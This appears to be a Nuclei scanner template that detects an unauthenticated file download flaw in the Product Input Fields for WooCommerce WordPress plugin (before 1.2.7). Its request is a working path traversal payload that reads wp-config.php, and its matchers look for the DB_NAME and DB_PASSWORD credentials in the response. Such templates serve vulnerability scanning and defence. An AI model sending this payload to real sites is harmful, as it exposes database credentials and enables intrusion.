id: product-input-fields-for-woocommerce-file-download
info:
  author: 0x_Akoko
  description: The lack of authorisation checks in the handle_downloads() function,
    hooked to admin_init() could allow unauthenticated users to download arbitrary
    files from the blog using a path traversal payload.
  name: Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download
  reference:
  - https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74
  - https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/
  severity: high
  tags: wordpress,woocommerce,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php'
